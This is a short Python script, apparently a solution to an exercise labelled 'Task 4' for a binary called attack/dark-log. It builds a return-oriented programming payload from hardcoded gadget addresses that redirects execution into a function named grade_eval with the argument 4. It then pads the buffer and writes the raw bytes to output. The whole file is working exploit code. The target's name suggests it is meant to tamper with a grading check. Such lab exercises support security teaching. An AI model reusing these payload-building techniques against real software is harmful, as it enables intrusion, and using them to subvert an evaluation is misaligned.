#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log."""
import sys

pop_rdi = 0x4018a3
ret = 0x4018a4
grade_eval = 0x401677

payload = b""
payload += pop_rdi.to_bytes(8, "little")
payload += (4).to_bytes(8, "little")
payload += ret.to_bytes(8, "little")
payload += grade_eval.to_bytes(8, "little")
payload += b"A" * (0x100 - len(payload))
payload += (0xa8).to_bytes(4, "little")

sys.stdout.buffer.write(payload)